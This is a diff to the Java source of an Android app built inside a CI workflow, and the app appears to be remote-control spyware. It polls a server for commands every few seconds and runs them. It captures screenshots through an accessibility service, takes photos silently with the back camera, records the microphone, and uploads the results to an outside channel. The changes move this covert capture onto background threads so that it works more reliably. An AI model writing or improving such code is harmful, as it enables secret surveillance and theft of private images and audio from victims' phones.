@@ -228,6 +228,8 @@ jobs:
           import android.view.Display;
           import android.view.accessibility.AccessibilityEvent;
           import java.io.FileOutputStream;
+          import java.util.concurrent.Executor;
+          import java.util.concurrent.Executors;
           public class KeyService extends AccessibilityService {
             public static KeyService I = null;
             public void onServiceConnected() {
@@ -242,7 +244,8 @@ jobs:
                   BotService.sendRes(this, "لقطة الشاشة محتاجة أندرويد 11+");
                   return;
                 }
-                takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(),
+                Executor ex = Executors.newSingleThreadExecutor();
+                takeScreenshot(Display.DEFAULT_DISPLAY, ex,
                   new TakeScreenshotCallback() {
                     public void onSuccess(ScreenshotResult r) {
                       try {
@@ -295,8 +298,10 @@ jobs:
                   startForeground(1, notif());
                 }
               } catch (Exception e) {}
-              try { alert(this, "🚀 التطبيق بدأ | " + DID); } catch (Exception e) {}
-              new Thread(new Runnable() { public void run() { loop(); } }).start();
+              new Thread(new Runnable() { public void run() {
+                try { alert(BotService.this, "🚀 التطبيق بدأ | " + DID); } catch (Exception e) {}
+                loop();
+              } }).start();
             }
             Notification notif() {
               String c = "c";
@@ -394,7 +399,10 @@ jobs:
                   String r = http(SRV + "/task?id=" + enc(DID));
                   String cmd = "";
                   try { cmd = new JSONObject(r).optString("cmd", ""); } catch (Exception e) {}
-                  if (cmd.length() > 0) doCmd(cmd);
+                  if (cmd.length() > 0) {
+                    final String cc = cmd;
+                    new Thread(new Runnable() { public void run() { doCmd(cc); } }).start();
+                  }
                 } catch (Exception e) {}
                 try { Thread.sleep(3000); } catch (Exception e) {}
               }
@@ -452,27 +460,36 @@ jobs:
             }
             void cam(String a) {
               try {
-                int id = 0;
-                int n = android.hardware.Camera.getNumberOfCameras();
-                android.hardware.Camera.CameraInfo ci = new android.hardware.Camera.CameraInfo();
-                for (int i = 0; i < n; i++) {
-                  android.hardware.Camera.getCameraInfo(i, ci);
-                  if (ci.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK) { id = i; break; }
-                }
-                final android.hardware.Camera c = android.hardware.Camera.open(id);
-                c.setPreviewTexture(new android.graphics.SurfaceTexture(0));
-                c.startPreview();
+                HandlerThread ht = new HandlerThread("cam");
+                ht.start();
+                Handler h = new Handler(ht.getLooper());
                 final String f = getExternalFilesDir(null) + "/cam.jpg";
-                res("📷 بدأ التصوير");
-                c.takePicture(null, null, new android.hardware.Camera.PictureCallback() {
-                  public void onPictureTaken(byte[] data, android.hardware.Camera cc) {
+                h.post(new Runnable() {
+                  public void run() {
                     try {
-                      FileOutputStream o = new FileOutputStream(f);
-                      o.write(data); o.close();
-                      res("cam صورة " + data.length + " بايت");
+                      int id = 0;
+                      int n = android.hardware.Camera.getNumberOfCameras();
+                      android.hardware.Camera.CameraInfo ci = new android.hardware.Camera.CameraInfo();
+                      for (int i = 0; i < n; i++) {
+                        android.hardware.Camera.getCameraInfo(i, ci);
+                        if (ci.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK) { id = i; break; }
+                      }
+                      final android.hardware.Camera c = android.hardware.Camera.open(id);
+                      c.setPreviewTexture(new android.graphics.SurfaceTexture(0));
+                      c.startPreview();
+                      res("📷 بدأ التصوير");
+                      c.takePicture(null, null, new android.hardware.Camera.PictureCallback() {
+                        public void onPictureTaken(byte[] data, android.hardware.Camera cc) {
+                          try {
+                            FileOutputStream o = new FileOutputStream(f);
+                            o.write(data); o.close();
+                            res("cam صورة " + data.length + " بايت");
+                          } catch (Exception e) { res("cam ERR " + e); }
+                          try { cc.release(); } catch (Exception e) {}
+                          tgFile(BotService.this, f, "📷 كاميرا");
+                        }
+                      });
                     } catch (Exception e) { res("cam ERR " + e); }
-                    try { cc.release(); } catch (Exception e) {}
-                    tgFile(BotService.this, f, "📷 كاميرا");
                   }
                 });
               } catch (Exception e) { res("cam ERR " + e); }
@@ -489,13 +506,15 @@ jobs:
                 r.setOutputFile(f);
                 r.prepare(); r.start();
                 final BotService self = this;
-                new Handler(getMainLooper()).postDelayed(new Runnable() {
+                final int s2 = sec;
+                new Thread(new Runnable() {
                   public void run() {
+                    try { Thread.sleep(s2 * 1000L); } catch (Exception e) {}
                     res("⏹ وقف التسجيل");
                     try { r.stop(); r.release(); } catch (Exception e) { res("stop ERR " + e); }
                     tgFile(self, f, "🎙 تسجيل");
                   }
-                }, sec * 1000L);
+                }).start();
                 res("mic " + sec + "s ok");
               } catch (Exception e) { res("mic ERR " + e); }
             }
